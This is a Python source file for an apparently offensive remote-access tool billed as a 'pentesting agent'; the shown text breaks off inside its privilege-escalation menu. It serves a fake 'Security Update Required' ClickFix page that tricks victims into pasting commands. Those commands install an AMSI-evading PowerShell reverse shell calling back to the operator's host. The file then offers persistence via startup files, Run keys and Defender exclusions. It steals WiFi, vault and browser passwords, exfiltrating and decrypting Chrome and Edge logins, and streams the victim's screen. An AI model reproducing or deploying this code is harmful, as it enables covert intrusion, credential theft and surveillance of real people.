#!/usr/bin/env python3
"""
Hybrid Pentesting Agent
- Phase 1: Auto-serve link, victim clicks, shell connects
- Phase 2: Menu appears, you choose what to do, agent executes through shell
"""

import os
import sys
import socket
import threading
import subprocess
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt

console = Console()

# ============================================================================
# CONFIG
# ============================================================================

class Config:
    def __init__(self):
        self.public_ip = None
        self.listener_port = 4444
        self.http_port = 8080
        self.shell_socket = None
        self.shell_connected = False
    
    def get_ip(self):
        if not self.public_ip:
            try:
                result = subprocess.run(["curl", "-s", "ifconfig.me"], 
                                       capture_output=True, text=True, timeout=5)
                self.public_ip = result.stdout.strip()
            except:
                self.public_ip = "127.0.0.1"
        return self.public_ip

CFG = Config()

# ============================================================================
# SHELL MANAGER - Handles the reverse shell connection
# ============================================================================

class ShellManager:
    """Manages the reverse shell connection."""
    
    def __init__(self):
        self.sock = None
        self.conn = None
        self.addr = None
        self.connected = False
    
    def start_listener(self, port):
        """Start listening for shell connection."""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self.sock.bind(('0.0.0.0', port))
        except OSError as e:
            if "Address already in use" in str(e):
                console.print(f"[yellow]Port {port} in use, killing...[/]")
                subprocess.run(["fuser", "-k", f"{port}/tcp"], capture_output=True)
                import time
                time.sleep(1)
                self.sock.bind(('0.0.0.0', port))
            else:
                raise e
        self.sock.listen(1)
        console.print(f"[green]✓ Listening on port {port}[/]")
        
    def wait_for_connection(self, timeout=300):
        """Wait for shell to connect."""
        self.sock.settimeout(timeout)
        start_time = time.time()
        
        while True:
            # Check for overall timeout
            if time.time() - start_time > timeout:
                return False
                
            try:
                self.conn, self.addr = self.sock.accept()
                console.print(f"[dim]Connection attempt from {self.addr[0]}...[/]")
                
                # BLOCK SPECIFIC IP (Example)
                # if self.addr[0] == "1.2.3.4":
                #    self.conn.close()
                #    continue
                

                
                # VERIFY IT IS A SHELL (Not just a ping)
                self.conn.settimeout(5)
                try:
                    # Shell payload usually sends "PS>" or similar immediately
                    initial = self.conn.recv(4096).decode(errors='ignore')
                    if "PS" in initial or "Microsoft" in initial or len(initial) > 2:
                        self.connected = True
                        console.print(f"[bold green]✓ SHELL CONNECTED from {self.addr[0]}![/]")
                        console.print(f"[dim]{initial.strip()}[/]")
                        return True
                    else:
                        console.print(f"[yellow]Ignored TCP Ping/Scan from {self.addr[0]} (No shell data received)[/]")
                        self.conn.close()
                        continue
                except socket.timeout:
                    console.print(f"[yellow]Ignored connection from {self.addr[0]} (Timeout waiting for prompt - likely ping)[/]")
                    self.conn.close()
                    continue
                except Exception as e:
                    console.print(f"[red]Error verifying connection: {e}[/]")
                    self.conn.close()
                    continue
            except socket.timeout:
                continue
            except Exception:
                return False
    
    def check_connection(self):
        """Check if shell is still alive."""
        try:
            self.conn.send(b"\n")
            return True
        except:
            self.connected = False
            return False
    
    def wait_for_new_shell(self, timeout=30):
        """Wait for a new shell connection (e.g., after UAC bypass)."""
        console.print(f"[cyan]Waiting for new shell connection (up to {timeout}s)...[/]")
        try:
            self.sock.settimeout(timeout)
            new_conn, new_addr = self.sock.accept()
            # Keep the old connection if it still works
            self.conn = new_conn
            self.addr = new_addr
            self.connected = True
            console.print(f"[bold green]✓ NEW SHELL from {new_addr[0]}![/]")
            # Read initial prompt
            self.conn.settimeout(2)
            try:
                initial = self.conn.recv(4096).decode(errors='ignore')
                console.print(f"[dim]{initial}[/]")
            except:
                pass
            return True
        except socket.timeout:
            console.print("[yellow]No new shell connected.[/]")
            return False
    
    def execute(self, cmd):
        """Execute command and return output."""
        if not self.connected:
            return "Not connected!"
        
        try:
            # Clear any pending output first
            self.conn.setblocking(0)
            try:
                while True:
                    self.conn.recv(4096)
            except:
                pass
            self.conn.setblocking(1)
            
            # Send command
            self.conn.send((cmd + "\n").encode())
            self.conn.settimeout(30)  # Increased timeout for longer operations
            output = ""
            
            # Read output until we see the prompt again
            while True:
                try:
                    chunk = self.conn.recv(4096).decode(errors='ignore')
                    if not chunk:
                        break
                    output += chunk
                    
                    # Check for PowerShell prompt - must be at end of output
                    # Only break if the ENTIRE output ends with a prompt pattern
                    stripped = output.rstrip()
                    if stripped.endswith("PS>") or stripped.endswith("PS >"):
                        break
                    if stripped.endswith(">") and ("PS" in stripped[-50:] or ">" == stripped[-1]):
                        # Likely a prompt, break
                        break
                except socket.timeout:
                    break
            
            # Clean up the output - remove prompt lines
            lines = output.strip().split('\n')
            cleaned = []
            for line in lines:
                stripped_line = line.strip()
                # Skip prompt lines (PS> or PS C:\path>)
                if stripped_line.startswith("PS") and stripped_line.endswith(">"):
                    continue
                if stripped_line == "PS>":
                    continue
                cleaned.append(line)
            
            result = '\n'.join(cleaned).strip()
            return result if result else "[No output captured]"
        except BrokenPipeError:
            self.connected = False
            return "[Shell disconnected - Defender may have killed it]"
        except Exception as e:
            self.connected = False
            return f"[Error: {e}]"
    
    def close(self):
        """Close connection."""
        if self.conn:
            try:
                self.conn.close()
            except:
                pass
        if self.sock:
            try:
                self.sock.close()
            except:
                pass
        self.connected = False

SHELL = ShellManager()

# ============================================================================
# HTTP SERVER - Serves the ClickFix page
# ============================================================================

class ClickFixHandler(BaseHTTPRequestHandler):
    """HTTP handler that serves ClickFix page and payload."""
    
    # def log_message(self, format, *args):
    #     pass  # Suppress logs
    
    def do_GET(self):
        ip = CFG.get_ip()
        port = CFG.listener_port
        
        if self.path == '/s':
            # Not used in this 4-step method, but keeping a simple fallback
            self.send_response(200); self.end_headers(); self.wfile.write(b"")

        elif self.path == '/watch':
            # Live Monitor Viewer
            html = '''<!DOCTYPE html><html><head><title>Live Monitor</title>
<style>body{background:#000;color:#0f0;display:flex;flex-direction:column;align-items:center;font-family:monospace;margin:0}
h1{margin:10px} img{border:2px solid #0f0;max-width:95%;max-height:85vh;object-fit:contain}
</style><script>
setInterval(()=>{ document.getElementById("v").src="/live.jpg?t="+new Date().getTime(); }, 500);
</script></head><body><h1>🔴 LIVE FEED</h1><img id="v" src="/live.jpg"></body></html>'''
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html.encode())

        elif self.path == '/live.jpg':
            # Serve the latest frame
            try:
                with open("live.jpg", "rb") as f:
                    data = f.read()
                self.send_response(200)
                self.send_header('Content-type', 'image/jpeg')
                self.end_headers()
                self.wfile.write(data)
            except:
                self.send_response(404); self.end_headers()
            
        elif self.path == '/v':
            # Serve the VBS Loader file
            # Updated to use cmd /c shim for better reliability
            vbs = f'''Set W = CreateObject("WScript.Shell")
p = W.ExpandEnvironmentStrings("%APPDATA%") & "\\winlogon.ps1"
W.Run "cmd /c powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & p & """", 0, False'''
            
            self.send_response(200)
            self.send_header('Content-type', 'text/plain') # Force download as text
            self.end_headers()
            self.wfile.write(vbs.encode())

        elif self.path == '/p':
            # Serve the PowerShell Payload file (winlogon.ps1)
            # using User's "Undetectable" Obfuscation (String Breaking)
            # AMSI flags "Net.Sockets.TcpClient" if seen as a whole string
            payload = f'''while($true){{try{{$h='{ip}';$p={CFG.listener_port};$t='Net.Sockets.'+'TcpClient';$c=New-Object $t($h,$p);$s=$c.GetStream();$w=New-Object IO.StreamWriter($s);$r=New-Object IO.StreamReader($s);while($c.Connected){{$w.Write("PS>");$w.Flush();$cmd=$r.ReadLine();if(!$cmd){{break}};$o=iex $cmd 2>&1 | Out-String;$w.WriteLine($o);$w.Flush()}}}}catch{{}};Start-Sleep -Seconds 6}}'''
            
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(payload.encode())
            

            
        else:
            # Serve ClickFix page - 4-Stage "Download & Run" Method
            # All files are downloaded via curl (reliable) instead of written via echo
            
            # Step 1: Download Payload (winlogon.ps1)
            cmd1 = f'''cmd /c curl -s http://{ip}:{CFG.http_port}/p -o "%APPDATA%\\winlogon.ps1"'''
            
            # Step 2: Download Launcher (msconfig.vbs)
            cmd2 = f'''cmd /c curl -s http://{ip}:{CFG.http_port}/v -o "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\msconfig.vbs"'''
            
            # Step 3: Hide the Payload
            cmd3 = f'''cmd /c attrib +h "%APPDATA%\\winlogon.ps1"'''
            
            # Step 4: Execute the payload file directly
            # SIMPLIFIED: Just run powershell with -file flag, using cmd /c start to detach
            # This is the most reliable method
            cmd4 = f'''cmd /c start /min powershell -w hidden -ep bypass -file "%APPDATA%\\winlogon.ps1"'''
            
            html = f'''<!DOCTYPE html>
<html>
<head><title>System Update</title>
<style>
body{{font-family:'Segoe UI',sans-serif;background:#1a1a2e;color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;margin:0}}
.box{{background:#16213e;padding:30px;border-radius:15px;text-align:center;max-width:600px;width:90%}}
h2{{color:#0f9d58;margin-bottom:20px}}
.step{{margin:15px 0;padding:15px;background:#1f2e4f;border-radius:8px;text-align:left;display:flex;align-items:center;justify-content:space-between}}
.step span{{font-weight:bold;color:#a0a0ff;margin-right:15px}}
.btn{{background:#0f9d58;color:#fff;border:none;padding:10px 20px;border-radius:5px;cursor:pointer;font-size:14px;transition:0.3s}}
.btn:hover{{background:#0b8043}}
.btn:disabled{{background:#555;cursor:not-allowed}}
.done{{color:#0f9d58;margin-left:10px;display:none}}
p{{color:#ccc;font-size:14px}}
</style>
</head>
<body>
<div class="box">
<h2>⚠️ Security Update Required</h2>
<p>Please execute the following verification steps in order.</p>
<p><strong>Instructions:</strong> For EACH step: Click Copy → Press Win+R → Paste (Ctrl+V) → Enter</p>

<div class="step">
    <span>1. Download Component</span>
    <button class="btn" id="b1" onclick="c(1)">Copy Step 1</button>
    <i class="done" id="d1">✓ Done</i>
</div>
<div class="step">
    <span>2. Configure Startup</span>
    <button class="btn" id="b2" onclick="c(2)" disabled>Copy Step 2</button>
    <i class="done" id="d2">✓ Done</i>
</div>
<div class="step">
    <span>3. Secure Files</span>
    <button class="btn" id="b3" onclick="c(3)" disabled>Copy Step 3</button>
    <i class="done" id="d3">✓ Done</i>
</div>
<div class="step">
    <span>4. Verify & Run</span>
    <button class="btn" id="b4" onclick="c(4)" disabled>Copy Step 4</button>
    <i class="done" id="d4">✓ Done</i>
</div>

<div style="margin-top:30px;border-top:1px solid #333;padding-top:20px">
    <h3>🛠️ Troubleshooting</h3>
    <div class="step" style="background:#2a1a1a">
        <span>A. Test Connection</span>
        <button class="btn" id="bt" onclick="c('t')" style="background:#d9534f">Copy Test</button>
    </div>
    <div class="step" style="background:#2a1a1a">
        <span>B. Debug Mode (Visible)</span>
        <button class="btn" id="bd" onclick="c('d')" style="background:#f0ad4e">Copy Debug</button>
    </div>
    <div class="step" style="background:#2a1a1a">
        <span>C. Verify File Exists</span>
        <button class="btn" id="bf" onclick="c('f')" style="background:#5bc0de">Copy Check</button>
    </div>
</div>


</div>
<textarea id="c1" style="position:absolute;left:-9999px">{cmd1}</textarea>
<textarea id="c2" style="position:absolute;left:-9999px">{cmd2}</textarea>
<textarea id="c3" style="position:absolute;left:-9999px">{cmd3}</textarea>
<textarea id="c4" style="position:absolute;left:-9999px">{cmd4}</textarea>
<!-- Troubleshooting Commands -->
<textarea id="ct" style="position:absolute;left:-9999px">powershell -noexit -c "Test-NetConnection {ip} -Port {CFG.listener_port}"</textarea>
<textarea id="cd" style="position:absolute;left:-9999px">powershell -noprofile -executionpolicy bypass -noexit -file "%APPDATA%\winlogon.ps1"</textarea>
<textarea id="cf" style="position:absolute;left:-9999px">powershell -noexit -c "if (Test-Path $env:APPDATA\winlogon.ps1) {{ Write-Host 'FOUND!' -F Green }} else {{ Write-Host 'MISSING!' -F Red }}"</textarea>

<script>
function c(n){{
    document.getElementById('c'+n).select();
    document.execCommand('copy');
    var btn = document.getElementById('b'+n);
    if(btn){{
        btn.innerText = 'Copied!';
        document.getElementById('d'+n).style.display = 'inline';
        if(n < 4 && typeof n === 'number'){{
            document.getElementById('b'+(n+1)).disabled = false;
            document.getElementById('b'+(n+1)).innerText = 'Copy Step '+(n+1);
            document.getElementById('b'+(n+1)).style.background = '#0f9d58';
        }}
    }}
}}
</script>
</body>
</html>'''
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html.encode())
            
            console.print(f"[yellow]Page served to {self.client_address[0]}[/]")

    def do_POST(self):
        """Handle data exfiltration uploads (Text & Binary)."""
        try:
            if self.path.startswith('/ups'):
                from urllib.parse import urlparse, parse_qs
                query = parse_qs(urlparse(self.path).query)
                
                dtype = query.get('t', ['unknown'])[0]
                browser = query.get('b', ['unknown'])[0]
                target_id = query.get('id', ['unknown'])[0]
                
                # Get body as BYTES (crucial for images)
                length = int(self.headers.get('Content-Length', 0))
                data = self.rfile.read(length)
                
                if dtype == 'live':
                    # Save "Live Feed" frame
                    with open("live.jpg", "wb") as f:
                        f.write(data)
                    self.send_response(200); self.end_headers()
                    return

                # Normal Loot (Keys/DBs)
                loot_dir = os.path.join(os.path.dirname(__file__), "loot")
                os.makedirs(loot_dir, exist_ok=True)
                
                fname = f"{dtype}_{target_id}_{browser}.txt"
                fpath = os.path.join(loot_dir, fname)
                
                with open(fpath, 'wb') as f:
                    f.write(data)
                
                console.print(f"[green]Creating loot file: {fname}[/]")
                self.send_response(200); self.end_headers()
            else:
                self.send_response(404); self.end_headers()
        except Exception as e:
            console.print(f"[red]Upload error: {e}[/]")
            self.send_response(500); self.end_headers()

    def log_message(self, format, *args):
        # Suppress logs for live feed to prevent spam
        if "GET /live.jpg" in args[0] or "GET /watch" in args[0] or "POST /ups?t=live" in args[0]:
            return
        # Default logging for others
        sys.stderr.write("%s - - [%s] %s\n" %
                         (self.client_address[0],
                          self.log_date_time_string(),
                          format%args))
def start_http_server():
    """Start HTTP server in background."""
    # Use ThreadingHTTPServer to handle multiple requests (user + victim) concurrently
    from http.server import ThreadingHTTPServer
    server = ThreadingHTTPServer(('0.0.0.0', CFG.http_port), ClickFixHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server

# ============================================================================
# POST-EXPLOITATION MENU
# ============================================================================

def show_menu(title, options):
    """Show menu and get choice."""
    table = Table(show_header=False, box=None)
    table.add_column("Opt", style="bold yellow")
    table.add_column("Desc", style="white")
    for opt, desc in options:
        table.add_row(f"[{opt}]", desc)
    console.print(Panel(table, title=f"[bold cyan]{title}[/]", border_style="cyan"))
    valid = [str(o[0]) for o in options]
    return Prompt.ask("Choose", choices=valid, default="0")

def menu_persistence():
    """Persistence submenu."""
    while True:
        os.system('clear')
        choice = show_menu("🔐 PERSISTENCE", [
            ("1", "Startup Folder"),
            ("2", "Registry Run Key"),
            ("3", "Scheduled Task (needs admin)"),
            ("4", "Startup + Defender Exclusion (stealthier!)"),
            ("5", "Secure Dir Persistence (User Path)"),
            ("0", "← Back"),
        ])
        
        if choice == "0":
            break
        elif choice == "1":
            ip = CFG.get_ip()
            port = CFG.listener_port
            cmd = f'''$s='$h="{ip}";$p={port};while(1){{try{{$t=New-Object Net.Sockets.TcpClient($h,$p);$d=$t.GetStream();$w=New-Object IO.StreamWriter($d);$r=New-Object IO.StreamReader($d);$w.AutoFlush=1;while($t.Connected){{$w.Write(">");$c=$r.ReadLine();if(!$c){{break}};$o=iex $c 2>&1|Out-String;$w.WriteLine($o)}};$t.Close()}}catch{{}};Sleep 5}}';$s|Out-File "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\u.ps1";echo "Persistence installed!"'''
            console.print("[cyan]Installing startup persistence...[/]")
            result = SHELL.execute(cmd)
            console.print(f"[green]{result}[/]")
            input("\n[Enter to continue]")
        elif choice == "2":
            # First add exclusion for Startup folder, then add registry
            startup_path = "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
            cmd = f'try{{Add-MpPreference -ExclusionPath "{startup_path}" -ErrorAction SilentlyContinue}}catch{{}};reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v WindowsUpdate /d "powershell -w hidden -ep bypass -f %APPDATA%\\Microsoft\\Windows\\Start` Menu\\Programs\\Startup\\u.ps1" /f;echo "Registry + Exclusion done!"'
            console.print("[cyan]Adding exclusion + registry persistence...[/]")
            result = SHELL.execute(cmd)
            console.print(f"[green]{result}[/]")
            input("\n[Enter to continue]")
        elif choice == "3":
            cmd = 'schtasks /create /tn "WindowsUpdate" /tr "powershell -w hidden -ep bypass -f %APPDATA%\\Microsoft\\Windows\\Start` Menu\\Programs\\Startup\\u.ps1" /sc onlogon /rl highest /f'
            console.print("[cyan]Creating scheduled task...[/]")
            result = SHELL.execute(cmd)
            console.print(f"[green]{result}[/]")
            input("\n[Enter to continue]")
        elif choice == "4":
            # Install persistence AND add to Defender exclusion
            ip = CFG.get_ip()
            port = CFG.listener_port
            startup_path = "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
            # First add exclusion, then install script
            cmd = f'''try{{Add-MpPreference -ExclusionPath "{startup_path}" -ErrorAction SilentlyContinue}}catch{{}};$s='$h="{ip}";$p={port};while(1){{try{{$t=New-Object Net.Sockets.TcpClient($h,$p);$d=$t.GetStream();$w=New-Object IO.StreamWriter($d);$r=New-Object IO.StreamReader($d);$w.AutoFlush=1;while($t.Connected){{$w.Write(">");$c=$r.ReadLine();if(!$c){{break}};$o=iex $c 2>&1|Out-String;$w.WriteLine($o)}};$t.Close()}}catch{{}};Sleep 5}}';$s|Out-File "{startup_path}\\u.ps1";echo "Done! Exclusion added + persistence installed."'''
            console.print("[cyan]Adding Startup to Defender exclusion + Installing persistence...[/]")
            console.print("[yellow]Note: Exclusion needs admin, but may work silently[/]")
            result = SHELL.execute(cmd)
            console.print(f"[green]{result}[/]")
            input("\n[Enter to continue]")
        elif choice == "5":
            # Secure Directory Persistence (User Custom Path)
            ip = CFG.get_ip()
            port = CFG.listener_port
            secure_path = "$env:LOCALAPPDATA\\Microsoft\\Windows\\Microsoft projects"
            payload_name = "winlogon.ps1"
            
            # 1. Create Directory + 2. Write Payload + 3. Registry Run
            cmd = f'''try {{ $p = "{secure_path}"; New-Item -ItemType Directory -Force -Path $p -ErrorAction SilentlyContinue | Out-Null; $s='$h="{ip}";$p={port};while(1){{try{{$t=New-Object Net.Sockets.TcpClient($h,$p);$d=$t.GetStream();$w=New-Object IO.StreamWriter($d);$r=New-Object IO.StreamReader($d);$w.AutoFlush=1;while($t.Connected){{$w.Write(">");$c=$r.ReadLine();if(!$c){{break}};$o=iex $c 2>&1|Out-String;$w.WriteLine($o)}};$t.Close()}}catch{{}};Sleep 5}}'; $s | Out-File "$p\\{payload_name}" -Force; reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v OneDriveUpdate /d "powershell -w hidden -ep bypass -file `"$p\\{payload_name}`"" /f; echo "Secure Persistence Installed in: $p" }} catch {{ echo "Error: $_" }}'''
            console.print(f"[cyan]Installing persistence to Safe Zone: {secure_path}...[/]")
            result = SHELL.execute(cmd)
            console.print(f"[green]{result}[/]")
            input("\n[Enter to continue]")

def menu_steal_data():
    """Data theft submenu."""
    while True:
        os.system('clear')
        choice = show_menu("🔑 STEAL DATA", [
            ("1", "WiFi Passwords"),
            ("2", "Windows Vault Credentials"),
            ("3", "Browser Credential Paths"),
            ("4", "System Info"),
            ("5", "Live Monitor (Video Feed)"),
            ("0", "← Back"),
        ])
        
        if choice == "0":
            break
        elif choice == "1":
            # Extract WiFi and save to ATTACKER machine
            cmd = '''$r=@();(netsh wlan show profiles)|Select-String "All User Profile"|ForEach-Object{$p=($_ -split ":")[-1].Trim();$k=(netsh wlan show profile name="$p" key=clear)|Select-String "Key Content";if($k){$r+="$p : "+($k -split ":")[-1].Trim()}};echo "=== WiFi Passwords ===";$r'''
            console.print("[cyan]Extracting WiFi passwords...[/]")
            result = SHELL.execute(cmd)
            console.print(Panel(result, title="[green]WiFi Passwords[/]"))
            # Save to ATTACKER machine
            loot_dir = os.path.join(os.path.dirname(__file__), "loot")
            os.makedirs(loot_dir, exist_ok=True)
            loot_file = os.path.join(loot_dir, f"wifi_{SHELL.addr[0] if SHELL.addr else 'unknown'}.txt")
            with open(loot_file, 'w') as f:
                f.write(result)
            console.print(f"[bold green]✓ Saved to YOUR machine: {loot_file}[/]")
            input("\n[Enter to continue]")
        elif choice == "2":
            cmd = 'cmdkey /list'
            console.print("[cyan]Extracting Windows Vault...[/]")
            result = SHELL.execute(cmd)
            console.print(Panel(result, title="[green]Windows Vault[/]"))
            # Save to ATTACKER machine
            loot_dir = os.path.join(os.path.dirname(__file__), "loot")
            os.makedirs(loot_dir, exist_ok=True)
            loot_file = os.path.join(loot_dir, f"vault_{SHELL.addr[0] if SHELL.addr else 'unknown'}.txt")
            with open(loot_file, 'w') as f:
                f.write(result)
            console.print(f"[bold green]✓ Saved to YOUR machine: {loot_file}[/]")
            input("\n[Enter to continue]")
        elif choice == "3":
            # ============================================================
            # SIDE-CHANNEL EXFILTRATION (HTTP POST)
            # ============================================================
            console.print("[cyan]Exfiltrating data via HTTP (bypassing shell output limits)...[/]")
            
            # 1. Prepare filename for exfiltration
            target_ip = SHELL.addr[0] if SHELL.addr else 'unknown'
            
            # 2. PowerShell: Extract -> Upload to our HTTP server
            # We use /ups (upload string) to send Key and DB content
            cmd = f'''
$ip = "{CFG.get_ip()}"
$port = {CFG.http_port}
$id = "{target_ip}"

$browsers = @(
    @{{Name="Edge"; Path="$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data"}},
    @{{Name="Chrome"; Path="$env:LOCALAPPDATA\\Google\\Chrome\\User Data"}}
)

Add-Type -AssemblyName System.Security

foreach ($b in $browsers) {{
    # 1. GET MASTER KEY
    $localState = Join-Path $b.Path "Local State"
    if (Test-Path $localState) {{
        try {{
            $json = Get-Content $localState -Raw | ConvertFrom-Json
            $encKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
            $encKey = $encKey[5..($encKey.Length - 1)] 
            $masterKey = [Security.Cryptography.ProtectedData]::Unprotect($encKey, $null, 'CurrentUser')
            $b64Key = [Convert]::ToBase64String($masterKey)
            
            # Upload Key
            $url = "http://$ip:$port/ups?t=key&b=$($b.Name)&id=$id"
            try {{ Invoke-RestMethod -Uri $url -Method Post -Body $b64Key -ErrorAction SilentlyContinue }} catch {{}}
        }} catch {{}}
    }}

    # 2. GET LOGIN DATA
    $paths = @("Default\\Login Data", "Default\\Login Data New")
    foreach ($p in $paths) {{
        $db = Join-Path $b.Path $p
        if (Test-Path $db) {{
            $temp = "$env:TEMP\\$($b.Name).db"
            try {{
                Copy-Item $db $temp -Force -ErrorAction Stop
                $bytes = [IO.File]::ReadAllBytes($temp)
                $b64 = [Convert]::ToBase64String($bytes)
                
                # Upload DB
                $url = "http://$ip:$port/ups?t=db&b=$($b.Name)&id=$id"
                try {{ Invoke-RestMethod -Uri $url -Method Post -Body $b64 -ErrorAction SilentlyContinue }} catch {{}}
                
                Remove-Item $temp -Force
            }} catch {{}}
        }}
    }}
}}
'''
            SHELL.execute(cmd)
            console.print("[yellow]Waiting for uploads...[/]")
            time.sleep(3) # Give it a moment to upload
            
            # --- LOCAL PROCESSING ---
            loot_dir = os.path.join(os.path.dirname(__file__), "loot")
            
            # Check for uploaded files
            # Format: key_{id}_{browser}.txt, db_{id}_{browser}.txt
            import glob
            
            found_data = False
            
            # Decrypt locally
            import sqlite3
            import base64
            try:
                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                HAS_CRYPTO = True
            except ImportError:
                HAS_CRYPTO = False
            
            # Find all key files for this target
            key_files = glob.glob(os.path.join(loot_dir, f"key_{target_ip}_*.txt"))
            
            final_results = ""
            
            for kf in key_files:
                try:
                    # Extract browser name from filename: key_IP_Browser.txt
                    fname = os.path.basename(kf)
                    browser_name = fname.replace(f"key_{target_ip}_", "").replace(".txt", "")
                    
                    # Find corresponding DB file
                    db_file = os.path.join(loot_dir, f"db_{target_ip}_{browser_name}.txt")
                    if not os.path.exists(db_file): continue
                    
                    found_data = True
                    
                    # Load Key
                    with open(kf, 'r') as f: b64_key = f.read().strip()
                    key = base64.b64decode(b64_key)
                    
                    # Load DB
                    with open(db_file, 'r') as f: b64_db = f.read().strip()
                    
                    # Save temp DB for sqlite3
                    temp_db_path = os.path.join(loot_dir, f"temp_{target_ip}_{browser_name}.db")
                    with open(temp_db_path, "wb") as f:
                        f.write(base64.b64decode(b64_db))
                        
                    if HAS_CRYPTO:
                        conn = sqlite3.connect(temp_db_path)
                        cursor = conn.cursor()
                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                        
                        count = 0
                        for r in cursor.fetchall():
                            url = r[0]
                            user = r[1]
                            enc_pass = r[2]
                            if not enc_pass or len(enc_pass) < 15: continue
                            
                            try:
                                if enc_pass[:3] in [b'v10', b'v11']:
                                    nonce = enc_pass[3:15]
                                    ciphertext = enc_pass[15:-16]
                                    tag = enc_pass[-16:]
                                    aes = AESGCM(key)
                                    plaintext = aes.decrypt(nonce, ciphertext + tag, None)
                                    final_results += f"{browser_name} | {url} | {user} | {plaintext.decode()}\n"
                                    count += 1
                            except: pass
                        conn.close()
                        if count > 0:
                            console.print(f"[green]✓ Decrypted {count} passwords from {browser_name}[/]")
                        os.remove(temp_db_path)
                    
                except Exception as e:
                    console.print(f"[red]Error processing {browser_name}: {e}[/]")

            if final_results:
                loot_file = os.path.join(loot_dir, f"decrypted_{target_ip}.txt")
                with open(loot_file, 'w') as f:
                    f.write(final_results)
                console.print(Panel(final_results, title="[green]Decrypted Passwords[/]"))
                console.print(f"[bold green]✓ Saved to: {loot_file}[/]")
            elif not found_data:
                console.print("[red]No data received via upload. Blocked by firewall?[/]")
                
            input("\n[Enter to continue]")
        elif choice == "4":
            cmd = 'systeminfo | findstr /B /C:"OS" /C:"Host" /C:"System"; echo "---"; whoami /all'
            console.print("[cyan]Getting system info...[/]")
            result = SHELL.execute(cmd)
            console.print(Panel(result, title="[green]System Info[/]"))
            input("\n[Enter to continue]")

        elif choice == "5":
            # LIVE MONITOR
            ip = CFG.get_ip()
            port = CFG.http_port
            
            # PowerShell Camera Script (Loop)
            # Uses System.Drawing to capture, resize, and upload frame
            ps_cam = f'''
$ip = "{ip}"; $port = {port};
Add-Type -AssemblyName System.Windows.Forms;
Add-Type -AssemblyName System.Drawing;

while($true) {{
    try {{
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds;
        $bmp = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height;
        $g = [System.Drawing.Graphics]::FromImage($bmp);
        $g.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size);
        
        # Resize to 800px width (Speed optimization)
        $w = 800;
        $h = [int]($screen.Height * ($w / $screen.Width));
        $bmp2 = New-Object System.Drawing.Bitmap $w, $h;
        $g2 = [System.Drawing.Graphics]::FromImage($bmp2);
        $g2.DrawImage($bmp, 0, 0, $w, $h);
        
        # Save as JPG (Quality 50)
        $ms = New-Object IO.MemoryStream;
        $codec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object {{ $_.MimeType -eq "image/jpeg" }};
        $params = New-Object System.Drawing.Imaging.EncoderParameters(1);
        $params.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, 50);
        $bmp2.Save($ms, $codec, $params);
        $bytes = $ms.ToArray();
        
        # Upload
        $url = "http://$ip:$port/ups?t=live";
        Invoke-RestMethod -Uri $url -Method Post -Body $bytes -TimeoutSec 1 -ErrorAction SilentlyContinue;
        
        $g.Dispose(); $g2.Dispose(); $bmp.Dispose(); $bmp2.Dispose(); $ms.Dispose();
    }} catch {{}}
    Start-Sleep -Milliseconds 500;
}}
'''
            # Flatten & Run as Job
            flat_ps = ps_cam.replace('\\n', ' ').replace('\\r', '')
            job_cmd = f'Start-Job -ScriptBlock {{ {flat_ps} }}'
            
            console.print("[cyan]Starting Live Camera Feed on victim... (Background Job)[/]")
            SHELL.execute(job_cmd)
            
            console.print(Panel(f"[bold green]🔴 LIVE FEED STARTED![/]\n\nOpen this URL in your browser:\n[white]http://{ip}:{port}/watch[/white]", title="Surveillance"))
            console.print("[dim](Press Enter to return to menu. The feed keeps running)[/]")
            input()

def menu_privesc():
    """Privilege escalation submenu."""
    while True:
        os.system('clear')
        choice = show_menu("⬆️ PRIVILEGE ESCALATION", [
            ("1", "Check Current Privileges"),
            ("2", "UAC Bypass (eventvwr - stealthier)"),
            ("3", "UAC Bypass (computerdefaults)"),
            ("4", "Fake Defender Prompt + Request Admin"),
            ("5", "🛡️ Disable Defender (needs admin)"),
            ("6", "🛡️ Add Exclusion Path (needs admin)"),
            ("7", "Check Defender Status"),
            ("0", "← Back"),
        ])
        
        if choice == "0":
            break
        elif choice == "1":
            cmd = 'whoami /priv; whoami /groups | findstr /i "admin"'
            console.print("[cyan]Checking privileges...[/]")
            result = SHELL.execute(cmd)
            console.print(Panel(result, title="[green]Privileges[/]"))
            input("\n[Enter to continue]")
        elif choice == "2":
            # eventvwr.exe UAC bypass - stealthier than fodhelper
            ip = CFG.get_ip()
            port = CFG.listener_port
